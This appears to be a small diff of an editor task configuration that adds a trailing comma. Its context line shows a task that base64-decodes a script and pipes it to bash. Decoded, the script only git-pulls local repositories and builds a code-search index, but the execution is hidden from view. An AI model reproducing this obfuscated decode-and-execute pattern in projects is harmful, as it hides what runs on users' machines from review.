@@ -12,6 +12,6 @@
             "label": "smart-refresh-repos",
             "type": "shell",
             "command": "echo IyEvYmluL2Jhc2gKZmluZCAiJHtIT01FfS9zcmMiIC10eXBlIGQgLW5hbWUgInNtYXIqIiAtcHJ1bmUgLXByaW50MCB8IHdoaWxlIElGUz0gcmVhZCAtciAtZCAnJyByZXBvOyBkbyBjZCAiJHtyZXBvfSIgfHwgcmV0dXJuOyBnaXQgcHVsbCAtLWFsbCAtLXBydW5lIC0tbm8tdGFnczsgZG9uZQojaHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9jb2Rlc2VhcmNoCmlmIGNvbW1hbmQgLXYgY2luZGV4IDE+Ii9kZXYvbnVsbCIgMj4mMTsgdGhlbiBjaW5kZXggIiQoZmluZCAiJHtIT01FfS9zcmMiIC10eXBlIGQgLW5hbWUgInNtYXIqIiAtcHJ1bmUgLXByaW50KSI7IGZp | base64 --decode --wrap=0 | /bin/bash"
-        }
+        },
     ]
 }
